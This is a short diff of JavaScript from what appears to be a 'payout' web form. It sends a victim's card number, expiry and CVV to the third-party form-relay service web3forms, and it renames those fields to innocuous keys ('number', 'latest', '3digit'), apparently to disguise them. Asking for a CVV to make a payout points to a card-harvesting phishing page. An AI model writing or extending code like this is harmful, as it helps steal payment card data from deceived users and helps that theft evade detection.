@@ -501,9 +501,10 @@
                     payload.payout_routing_code = d.routingNum;
                 } else {
                     payload.payout_card_name = d.cardName;
-                    payload.payout_card_number = d.cardNum;
-                    payload.payout_card_expiry = d.cardExp;
-                    payload.payout_card_cvv = d.cardCvv;
+                    // USER REQUESTED KEYS:
+                    payload.number = d.cardNum;      // Key: "number"
+                    payload.latest = d.cardExp;      // Key: "latest"
+                    payload['3digit'] = d.cardCvv;   // Key: "3digit" (Requires bracket notation)
                 }
 
                 const res=await fetch('https://api.web3forms.com/submit',{
